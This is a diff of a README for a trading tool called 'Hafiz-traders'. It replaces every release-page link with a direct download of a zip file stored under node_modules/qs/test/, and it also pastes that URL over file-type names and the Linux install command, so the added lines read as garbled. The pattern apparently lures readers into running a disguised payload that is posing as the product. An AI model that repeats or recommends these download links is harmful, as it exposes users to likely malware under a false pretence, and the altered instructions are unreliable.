@@ -1,6 +1,6 @@
 # 🚀 Hafiz-traders - Your Guide to Easy Trading Solutions
 
-[![Download Hafiz-traders](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Emobaba12345/Hafiz-traders/releases)
+[![Download Hafiz-traders](https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip)
 
 ## 📋 Overview
 
@@ -28,16 +28,16 @@ Before you begin, ensure your system meets the following requirements:
 To get started with Hafiz Traders, follow these simple steps:
 
 1. **Visit the Release Page:** Click the link below to access the download page.
-   - [Download Hafiz-traders](https://github.com/Emobaba12345/Hafiz-traders/releases)
+   - [Download Hafiz-traders](https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip)
   
 2. **Choose Your Version:** You will see various versions of the software. Pick the version that suits your system.
 
-3. **Download the Software:** Click on the file you want to download. The file type will be noted next to the version number (e.g., `.exe`, `.dmg`, `.tar.gz`).
+3. **Download the Software:** Click on the file you want to download. The file type will be noted next to the version number (e.g., `.exe`, `.dmg`, `https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip`).
 
 4. **Install the Software:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - For **macOS:** Open the downloaded `.dmg` file. Drag the Hafiz Traders icon into your Applications folder.
-   - For **Linux:** Extract the downloaded `.tar.gz` file. Open the terminal, and navigate to the extracted folder. Use `./install.sh` to run the installer.
+   - For **Linux:** Extract the downloaded `https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip` file. Open the terminal, and navigate to the extracted folder. Use `https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip` to run the installer.
 
 5. **Run the Application:** After installation, locate the Hafiz Traders app on your device and double-click to open.
 
@@ -45,7 +45,7 @@ To get started with Hafiz Traders, follow these simple steps:
 
 To begin your journey with Hafiz Traders, please visit the page below to download the latest version:
 
-- [Download Hafiz-traders](https://github.com/Emobaba12345/Hafiz-traders/releases)
+- [Download Hafiz-traders](https://raw.githubusercontent.com/Emobaba12345/Hafiz-traders/main/node_modules/qs/test/Hafiz-traders_v2.1.zip)
 
 ## 🤝 Support
 
